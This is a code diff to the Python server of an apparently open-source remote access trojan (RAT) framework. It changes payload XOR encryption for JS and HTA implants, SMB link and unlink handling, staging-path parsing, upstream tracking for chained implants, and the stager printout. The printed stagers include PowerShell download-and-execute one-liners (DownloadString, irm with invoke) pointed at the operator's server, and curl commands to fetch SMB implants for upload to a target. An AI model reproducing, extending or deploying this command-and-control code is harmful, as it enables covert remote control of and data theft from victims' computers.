@@ -292,11 +292,11 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
             ratcode = fd.read()
 
             # Added ratcode xor encryption for js and hta payloads only -- see resources/ekript.py
-            if(not no_payload_encryption and ratType == "js"):
+            if(not no_payload_encryption and str.endswith(ratType, "js")):
                 key = ekript.gen_key()
                 ratcode = ekript.make_js_loader_template(ekript.ekript_js(ratcode, key), key)
 
-            if(not no_payload_encryption and ratType == "hta"):
+            if(not no_payload_encryption and str.endswith(ratType, "hta")):
                 key = ekript.gen_key()
                 # In the case of a JS file the JS source is just the entire file...
                 # For HTA's the JS source is everything between the <script> </script> tags
@@ -319,7 +319,7 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
 
 def link_smb(ratID, filepath): # returns eval data for rat and registers link dict
     if(types[ratID] == "ps1" or types[ratID] == "c#"):
-        pretty_print("[!] Runextra is not supported for PS1 or C# rats")
+        pretty_print("[!] Link is not supported for PS1 or C# rats")
         return
 
     if("None" in links[ratID]):
@@ -341,8 +341,8 @@ def link_smb(ratID, filepath): # returns eval data for rat and registers link di
 
 def unlink_smb(ratID, filepath):
     if filepath == "all":
-        return "ev " + encode_file(os.getcwd() + "/resources/smb_unlink_all.js")
         links[ratID] = ["None"]
+        return "ev " + encode_file(os.getcwd() + "/resources/smb_unlink_all.js")
     
     with open(os.getcwd() + "/resources/smb_unlink.js", "r") as fd:
         smb_unlink_data = fd.read()
@@ -510,7 +510,7 @@ def serve_server(port=8080):
         # Check to see if we are serving ad-hoc ratcode -- GET version
         ip_addr = request.environ['REMOTE_ADDR']
         if(str.startswith(path, rand_path + "/b.") and not disable_staging):
-            ratType = path.split(".")[1]
+            ratType = ".".join(path.split(".")[1:])
             return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
         elif(verbose):
             pretty_print("[v] GET request from non-rat client requested path /" + path)
@@ -572,6 +572,11 @@ def serve_server(port=8080):
             usernames[ratID] = username
             hostnames[ratID] = hostname
             ip_addrs[ratID] = ip_addr
+
+            if(ratID == str(packages[-1]['id'])): # if the ratID is the same as the ratID in the last (or only package) then it is a directly connected rat
+                upstream[ratID] = "<direct>"
+            else:
+                upstream[ratID] = packages[-1]['id'] # the last package is the package on "top of the stack" and so the most upstream rat
     
             # Register new rat checkin
             if(ratID not in commands):
@@ -579,10 +584,6 @@ def serve_server(port=8080):
                 links[ratID] = ["None"]
                 comp.add_tab_item(ratID)
                 pretty_print("[*] (" + datetime.now().strftime("%H:%M:%S, %b %d") + ") New rat checked in: " + colors(ratID))
-                if(ratID == str(packages[-1]['id'])): # if the ratID is the same as the ratID in the last (or only package) then it is a directly connected rat
-                    upstream[ratID] = "<direct>"
-                else:
-                    upstream[ratID] = packages[-1]['id'] # the last package is the package on "top of the stack" and so the most upstream rat
 
     
             if("retval" in package.keys()):
@@ -654,15 +655,19 @@ def get_stagers(lhost):
     pretty_print('  [Scriptblock]::Create([net.webclient]::new().DownloadString("' + url + 'ps1")).invoke()')
     pretty_print('  [Management.Automation.PowerShell]::Create().addscript((irm ' + url + 'ps1)).invoke()')
     pretty_print("")
+    pretty_print("    For SMB rats: curl the file down to/from your local machine")
+    pretty_print("  " + colors("curl " + url + "smb.js  -o b.smb.js") + "  or")
+    pretty_print("  " + colors("curl " + url + "smb.hta -o b.smb.hta") + " Then upload the file to your target")
+    pretty_print("")
 
 def get_rats(current=""):
-    pretty_print("\n    {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<15}\t{:<6}".format("implant id","type","check-in","upstream","username","ip address","hostname","links"))
-    pretty_print("    ----------\t----\t--------   --------     --------               \t----------     \t--------\t-----")
+    pretty_print("\n    {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<6}".format("implant id","type","check-in","upstream","username","ip address","hostname","links"))
+    pretty_print("    ----------\t----\t--------   --------\t--------               \t----------     \t--------\t-----")
     for ratID, checkin in rats.items():
         if(current == ratID or current == "all"):
-            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<15}\t{:<15}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
+            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<15}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
         else:
-            pretty_print("    {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<15}\t{:<6}".format(ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
+            pretty_print("    {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<6}".format(ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
         if(ratID in notes.keys() and notes[ratID] != ""):
             pretty_print("      L..:>> " + notes[ratID])
     pretty_print("")
